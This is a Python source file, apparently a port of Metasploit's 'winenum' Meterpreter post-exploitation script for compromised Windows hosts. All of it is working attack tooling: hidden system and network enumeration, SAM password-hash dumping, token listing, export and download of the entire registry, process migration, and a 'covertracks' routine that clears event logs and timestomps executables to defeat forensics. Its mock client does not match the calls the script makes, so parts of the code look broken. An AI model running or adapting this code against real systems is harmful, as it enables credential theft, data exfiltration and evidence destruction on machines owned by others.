#!/usr/bin/env python3

#
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
#

# Author: Carlos Perez at carlos_perez[at]darkoperator.com
# Python translation: Your Name/Handle
# -------------------------------------------------------------------------------

import argparse
import os
import threading
import time
from datetime import datetime

# Assuming a 'client' object is available, similar to the Ruby script.
# This client object would provide the necessary APIs to interact with the Meterpreter session.
# For example: client.sys.config, client.sys.process, client.fs.file, etc.

# ================== Variable Declarations ==================

# A mock client for standalone testing, replace with actual client object in production
class MockClient:
    class MockSys:
        class MockConfig:
            def sysinfo(self):
                return {'Computer': 'TESTPC', 'OS': 'Windows 7'}
            def getenv(self, var):
                return f'%{var}%'
            def getuid(self):
                return 'NT AUTHORITY\\SYSTEM'
        class MockProcess:
            def execute(self, cmd, args, opts):
                print(f"Executing: {cmd}")
                return self
            def get_processes(self):
                return [{'name': 'explorer.exe'}]
            def open(self):
                return self
            @property
            def name(self):
                return "python.exe"
            @property
            def pid(self):
                return 1234
            def close(self):
                pass
            @property
            def channel(self):
                return self
            def read(self):
                return ""
        class MockRegistry:
            def splitkey(self, key):
                return key.split('\\', 1)
            def open_key(self, root, base, perm):
                return self
            def query_value(self, val_name):
                class MockValue:
                    @property
                    def data(self):
                        return "mock_data"
                return MockValue()
        class MockEventLog:
            def open(self, log_name):
                return self
            def clear(self):
                pass
        sys = MockSys()
        process = MockProcess()
        registry = MockRegistry()
        eventlog = MockEventLog()
        config = MockConfig()
    class MockFs:
        class MockFile:
            def download_file(self, dst, src):
                print(f"Downloading {src} to {dst}")
            def rm(self, path):
                print(f"Deleting {path}")
            def new(self, path, mode):
                return self
            def read(self):
                return b"wmic_output"
            def eof(self):
                return True
            def close(self):
                pass
        file = MockFile()
    class MockCore:
        def use(self, lib):
            print(f"Using library: {lib}")
        def migrate(self, pid):
            print(f"Migrating to PID {pid}")
    class MockPriv:
        def sam_hashes(self):
            return ["hash1", "hash2"]
        class MockFsPriv:
            def set_file_mace_from_file(self, f1, f2):
                print(f"Stomping MACE of {f1} with {f2}")
        fs = MockFsPriv()
    class MockIncognito:
        def incognito_list_tokens(self, val):
            return {'delegation': 'token1\n', 'impersonation': 'token2\n'}

    sys = MockSys()
    fs = MockFs()
    core = MockCore()
    priv = MockPriv()
    incognito = MockIncognito()
    session_host = "127.0.0.1"
    session_port = 4444
    platform = 'windows'
    response_timeout = 120

# Uncomment the line below for standalone testing
# client = MockClient()

# ================== Functions ==================

def print_status(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[-] {msg}")

def file_local_write(file_path, data):
    with open(file_path, "a") as f:
        f.write(data + "\n")

def findprogs(log_dir):
    print_status("Extracting software list from registry")
    proglist = []
    appkeys = [
        'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
        'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'
    ]
    for key in appkeys:
        try:
            soft_keys = client.sys.registry.enum_key(key)
            if soft_keys:
                for skey in soft_keys:
                    try:
                        disp_name = client.sys.registry.query_value(f"{key}\\{skey}", "DisplayName")
                        disp_version = client.sys.registry.query_value(f"{key}\\{skey}", "DisplayVersion")
                        proglist.append(f"{disp_name.data},{disp_version.data}")
                    except Exception:
                        continue
        except Exception:
            continue

    with open(os.path.join(log_dir, "programs_list.csv"), "w") as f:
        f.write("\n".join(proglist))

def chkvm():
    vmout = ''
    info = client.sys.config.sysinfo()
    print_status(f"Checking if {info['Computer']} is a Virtual Machine ........" )

    try:
        key = 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS'
        root_key, base_key = client.sys.registry.splitkey(key)
        open_key = client.sys.registry.open_key(root_key, base_key)
        v = open_key.query_value('SystemManufacturer')
        sys_manuf = v.data.lower()
        if 'vmware' in sys_manuf:
            vmout = "This is a VMware Workstation/Fusion Virtual Machine"
        elif 'xen' in sys_manuf:
            vmout = "This is a Xen Virtual Machine"
        if vmout:
            print_status(f"\t{vmout}")
            return vmout + "\n\n"
    except Exception:
        pass

    try:
        key2 = "HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"
        root_key2, base_key2 = client.sys.registry.splitkey(key2)
        open_key2 = client.sys.registry.open_key(root_key2, base_key2)
        v2 = open_key2.query_value('Identifier')
        ident = v2.data.lower()
        if 'vmware' in ident:
            vmout = "This is a VMWare virtual Machine"
        elif 'vbox' in ident:
            vmout = "This is a Sun VirtualBox virtual Machine"
        elif 'xen' in ident:
            vmout = "This is a Xen virtual Machine"
        elif 'virtual hd' in ident:
            vmout = "This is a Hyper-V/Virtual Server virtual Machine"
        if vmout:
            print_status(f"\t{vmout}")
    except Exception:
        pass
    return vmout + "\n\n" if vmout else ""

def list_exec(cmd_list, log_dir):
    print_status("Running Command List ...")
    for cmd in cmd_list:
        try:
            print_status(f"\trunning command {cmd}")
            r = client.sys.process.execute(cmd, None, {'Hidden': True, 'Channelized': True})
            cmdout = ""
            while True:
                d = r.channel.read(1024)
                if not d:
                    break
                cmdout += d
            r.channel.close()
            r.close()

            log_file = os.path.join(log_dir, f"{cmd.replace(' ', '_').replace('/', '_')}.txt")
            with open(log_file, "w") as f:
                f.write(cmdout)
        except Exception as e:
            print_error(f"Error executing '{cmd}': {e}")

def wmicexec(wmic_cmds, log_dir):
    print_status("Running WMIC Commands ....")
    try:
        tmp = client.sys.config.getenv('TEMP')
        for wmi in wmic_cmds:
            try:
                wmicfl = f"{tmp}\\{int(time.time() * 1000) % 100000:05d}.csv"
                print_status(f"\trunning command wmic {wmi}")
                flname = os.path.join(log_dir, f"wmic_{wmi.replace(' ', '_').replace('/', '_')}.csv")

                cmd = f"cmd.exe /c wmic /append:{wmicfl} {wmi} /format:csv"
                r = client.sys.process.execute(cmd, None, {'Hidden': True})
                time.sleep(2)

                # Wait for wmic.exe to finish
                while 'wmic.exe' in [p['name'].lower() for p in client.sys.process.get_processes()]:
                    time.sleep(0.5)
                r.close()

                wmioutfile = client.fs.file.new(wmicfl, "rb")
                tmpout = b""
                while not wmioutfile.eof():
                    tmpout += wmioutfile.read()
                wmioutfile.close()

                with open(flname, "wb") as f:
                    f.write(tmpout)

                client.fs.file.rm(wmicfl)
            except Exception as e:
                print_error(f"Error running WMIC command '{wmi}': {e}")
    except Exception as e:
        print_error(f"Error running WMIC commands: {e}")

def gethash(log_dir):
    print_status("Dumping password hashes...")
    try:
        client.core.use("priv")
        time.sleep(3)
        hashes = client.priv.sam_hashes()
        hash_str = "\n".join([str(h) for h in hashes]) + "\n\n\n"
        print_status("Hashes Dumped")
        flname = os.path.join(log_dir, "hashdump.txt")
        with open(flname, "w") as f:
            f.write(hash_str)
    except Exception as e:
        print_error(f"Error dumping hashes: {e}")
        print_error("Payload may be running with insufficient privileges!")

def listtokens(log_dir):
    try:
        print_status("Getting Tokens...")
        dt = "****************************\n"
        dt += "  List of Available Tokens\n"
        dt += "****************************\n\n"

        client.core.use("incognito")
        for i in range(2):
            tType = "User" if i == 0 else "Group"
            tokens = client.incognito.incognito_list_tokens(i)

            dt += f"{tType} Delegation Tokens Available \n"
            dt += "======================================== \n"
            dt += tokens['delegation'] + "\n"

            dt += f"\n{tType} Impersonation Tokens Available \n"
            dt += "======================================== \n"
            dt += tokens['impersonation'] + "\n"

        print_status("All tokens have been processed")
        file_local_write(os.path.join(log_dir, "tokens.txt"), dt)
    except Exception as e:
        print_error(f"Error Getting Tokens: {e}")

def clrevtlgs(log_file):
    evtlogs = [
        'security', 'system', 'application', 'directory service',
        'dns server', 'file replication service'
    ]
    print_status("Clearing Event Logs, this will leave an event 517")
    try:
        for evl in evtlogs:
            print_status(f"\tClearing the {evl} Event Log")
            log = client.sys.eventlog.open(evl)
            log.clear()
            file_local_write(log_file, f"Cleared the {evl} Event Log")
        print_status("All Event Logs have been cleared")
    except Exception as e:
        print_error(f"Error clearing Event Log: {e}")

def chmace(cmds, log_file):
    print_status("Changing Access Time, Modified Time and Created Time of Files Used")
    try:
        windir = client.sys.config.getenv('WinDir')
        client.core.use("priv")
        for c in cmds:
            try:
                filetostomp = os.path.join(windir, "system32", c)
                fl2clone = os.path.join(windir, "system32", "chkdsk.exe")
                print_status(f"\tChanging file MACE attributes on {filetostomp}")
                client.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
                file_local_write(log_file, f"Changed MACE of {filetostomp}")
            except Exception as e:
                print_error(f"Error changing MACE: {e}")
    except Exception as e:
        print_error(f"Error in chmace setup: {e}")

def regdump(log_dir, filename):
    hives = ["HKCU", "HKLM", "HKCC", "HKCR", "HKU"]
    windir = client.sys.config.getenv('WinDir')
    print_status('Dumping and Downloading the Registry')

    for hive in hives:
        try:
            print_status(f"\tExporting {hive}")
            reg_path = f"{windir}\\Temp\\{hive}{filename}.reg"
            cab_path = f"{windir}\\Temp\\{hive}{filename}.cab"

            r1 = client.sys.process.execute(f"cmd.exe /c reg.exe export {hive} {reg_path}", None, {'Hidden': True, 'Channelized': True})
            r1.channel.read() # Consume output
            r1.channel.close()
            r1.close()

            print_status(f"\tCompressing {hive} into cab file")
            r2 = client.sys.process.execute(f"cmd.exe /c makecab {reg_path} {cab_path}", None, {'Hidden': True, 'Channelized': True})
            r2.channel.read() # Consume output
            r2.channel.close()
            r2.close()

        except Exception as e:
            print_error(f"Error dumping Registry Hive {hive}: {e}")

    for hive in hives:
        try:
            cab_path = f"{windir}\\Temp\\{hive}{filename}.cab"
            local_path = os.path.join(log_dir, f"{client.session_host}-{hive}{filename}.cab")
            print_status(f"\tDownloading {hive}{filename}.cab to -> {local_path}")
            client.fs.file.download_file(local_path, cab_path)
            time.sleep(5)
        except Exception as e:
            print_error(f"Error Downloading Registry Hive {hive}: {e}")

    print_status("\tDeleting left over files")
    client.sys.process.execute("cmd.exe /c del %WinDir%\\Temp\\HK*", None, {'Hidden': True})

def covertracks(cmdstomp, log_file, trgtos, uac_enabled):
    if uac_enabled:
        print_status("UAC is enabled, Logs could not be cleared under current privileges")
        return

    clrevtlgs(log_file)
    nonwin2kexe = ['netsh.exe', 'gpresult.exe', 'tasklist.exe', 'wbem\\wmic.exe']
    if 'Windows 2000' in trgtos:
        cmds_to_stomp = [c for c in cmdstomp if c not in nonwin2kexe]
    else:
        cmds_to_stomp = cmdstomp
    chmace(cmds_to_stomp, log_file)

def migrate():
    target = 'cmd.exe'
    print_status(f"Launching hidden {target}...")
    newproc = client.sys.process.execute(target, None, {'Hidden': True})
    print_status(f"Process {newproc.pid} created.")

    server = client.sys.process.open()
    print_status(f"Current process is {server.name} ({server.pid}). Migrating to {newproc.pid}.")

    client.core.migrate(newproc.pid)
    print_status("Migration completed successfully.")

    server = client.sys.process.open()
    print_status(f"New server process: {server.name} ({server.pid})")

def is_uac_enabled():
    try:
        # A simplified check. A more robust one would query the registry.
        # HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
        key = r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        v = client.sys.registry.query_value(key, 'EnableLUA')
        return v.data == 1
    except Exception:
        return False # Assume disabled if key not found

def main():
    parser = argparse.ArgumentParser(description="WinEnum -- Windows local enumeration")
    parser.add_argument("-m", "--migrate", action="store_true", help="Migrate the session to a new cmd.exe process first.")
    parser.add_argument("-r", "--regdump", action="store_true", help="Dump, compress and download entire Registry.")
    parser.add_argument("-c", "--covertracks", action="store_true", help="Change MACE times of executables and clear Event Logs.")
    args = parser.parse_args()

    if client.platform != 'windows':
        print_error("This script only runs on Windows platforms!")
        return

    if args.migrate:
        migrate()

    print_status("Running Windows Local Enumeration Meterpreter Script")
    info = client.sys.config.sysinfo()
    host, port = client.session_host, client.session_port
    print_status(f"New session on {host}:{port}...")

    filenameinfo = "_" + datetime.now().strftime("%Y%m%d.%M%S")
    logs_base = os.path.join(os.path.expanduser("~"), ".msf4", "logs", "scripts", "winenum")
    log_dir = os.path.join(logs_base, f"{info['Computer']}{filenameinfo}")
    os.makedirs(log_dir, exist_ok=True)

    log_file = os.path.join(log_dir, f"{info['Computer']}{filenameinfo}.txt")

    header = f"Date:       {datetime.now().strftime('%Y-%m-%d.%H:%M:%S')}\n"
    header += f"Running as: {client.sys.config.getuid()}\n"
    header += f"Host:       {info['Computer']}\n"
    header += f"OS:         {info['OS']}\n\n\n"

    print_status(f"Saving general report to {log_file}")
    print_status(f"Output of each individual command is saved to {log_dir}")
    file_local_write(log_file, header)

    file_local_write(log_file, chkvm())
    trgtos = info['OS']
    uac_enabled = is_uac_enabled()
    if uac_enabled:
        print_status("\tUAC is Enabled")
        file_local_write(log_file, "UAC is Enabled")
    else:
        print_status("\tUAC is Disabled")
        file_local_write(log_file, "UAC is Disabled")

    commands = [
        'cmd.exe /c set', 'arp -a', 'ipconfig /all', 'ipconfig /displaydns', 'route print',
        'net view', 'netstat -nao', 'netstat -vb', 'netstat -ns', 'net accounts',
        'net accounts /domain', 'net session', 'net share', 'net group', 'net user',
        'net localgroup', 'net localgroup administrators', 'net group administrators',
        'net view /domain', 'netsh firewall show config', 'tasklist /svc', 'tasklist /m',
        'gpresult /SCOPE COMPUTER /Z', 'gpresult /SCOPE USER /Z'
    ]
    win2k8cmd = ['servermanagercmd.exe -q', 'cscript /nologo winrm get winrm/config']
    vstwlancmd = [
        'netsh wlan show interfaces', 'netsh wlan show drivers',
        'netsh wlan show profiles', 'netsh wlan show networks mode=bssid'
    ]
    nonwin2kcmd = [
        'netsh firewall show config', 'tasklist /svc', 'gpresult /SCOPE COMPUTER /Z',
        'gpresult /SCOPE USER /Z', 'prnport -l', 'prnmngr -g'
    ]
    wmic = [
        'useraccount list', 'group list', 'service list brief', 'volume list brief',
        'logicaldisk get description,filesystem,name,size',
        'netlogin get name,lastlogon,badpasswordcount', 'netclient list brief',
        'netuse get name,username,connectiontype,localname', 'share get name,path',
        'nteventlog get path,filename,writeable', 'process list brief',
        'startup list full', 'rdtoggle list', 'product get name,version', 'qfe',
    ]

    exec_cmds = commands
    if 'Windows XP' in trgtos and ('(2600, )' in trgtos or 'Service Pack 1' in trgtos):
        exec_cmds = [c for c in exec_cmds if c not in ['netstat -vb', 'netsh firewall show config']]
    elif 'Windows 2008' in trgtos:
        exec_cmds.extend(win2k8cmd)
    elif 'Windows Vista' in trgtos or 'Windows 7' in trgtos:
        exec_cmds.extend(vstwlancmd)
    elif 'Windows 2000' in trgtos:
        exec_cmds = [c for c in exec_cmds if c not in nonwin2kcmd]

    list_exec(exec_cmds, log_dir)
    wmicexec(wmic, log_dir)
    findprogs(log_dir)

    is_system = "system" in client.sys.config.getuid().lower()
    if 'Windows 2008' in trgtos or 'Windows Vista' in trgtos or 'Windows 7' in trgtos:
        if not is_system:
            print_error("Not currently running as SYSTEM, not able to dump hashes.")
        else:
            gethash(log_dir)
    else:
        gethash(log_dir)

    listtokens(log_dir)

    if args.regdump:
        if not uac_enabled:
            regdump(log_dir, filenameinfo)
        else:
            print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")

    if args.covertracks:
        cmdstomp = [
            'cmd.exe', 'reg.exe', 'ipconfig.exe', 'route.exe', 'net.exe', 'netstat.exe',
            'netsh.exe', 'makecab.exe', 'tasklist.exe', 'wbem\\wmic.exe', 'gpresult.exe'
        ]
        covertracks(cmdstomp, log_file, trgtos, uac_enabled)

    print_status("Done!")

if __name__ == "__main__":
    # This check is for when the script is run directly.
    # In a real scenario, a 'client' object would be provided by the framework.
    if 'client' not in globals():
        print_error("This script must be run within a Meterpreter session.")
        # You might want to initialize a mock client here for testing purposes
        # from unittest.mock import Mock
        # client = Mock()
    else:
        main()